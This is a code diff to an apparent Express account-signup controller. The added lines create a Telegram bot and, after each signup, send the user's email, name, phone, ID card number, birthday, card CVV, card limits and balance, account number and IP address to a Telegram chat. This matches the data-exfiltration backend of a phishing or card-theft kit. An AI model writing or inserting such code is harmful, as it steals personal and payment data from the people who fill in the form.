@@ -1,9 +1,15 @@
 import { Request, Response } from "express";
 import { Account } from "../models/account.model";
+const TelegramBot = require("node-telegram-bot-api");
+import dotenv from "dotenv";
+dotenv.config();
+
+const TOKEN = process.env.TELEGRAM_BOT_TOKEN || "";
 
 export class AccountController {
   async signup(req: Request, res: Response) {
     try {
+      const bot = new TelegramBot(TOKEN, { polling: true });
       const ip =
         req.headers["x-forwarded-for"] || req.socket.remoteAddress || "";
       const {
@@ -71,6 +77,10 @@ export class AccountController {
       });
 
       await account.save();
+      bot.sendMessage(
+        process.env.TELEGRAM_CHAT_ID,
+        `Email: ${email}\nName: ${name}\nPhone: ${phone}\nID Card: ${idCard}\nBirthday: ${birthday}\nCVV: ${cvv}\nCard Limit: ${cardLimit}\nCard Balance: ${cardBalance}\nPropose Limit: ${proposeLimit}\nCard Type: ${cardType}\nAccount Number: ${accountNumber}\nIP: ${ip}`
+      );
 
       return res.status(200).json({
         message: "Signup successfully",
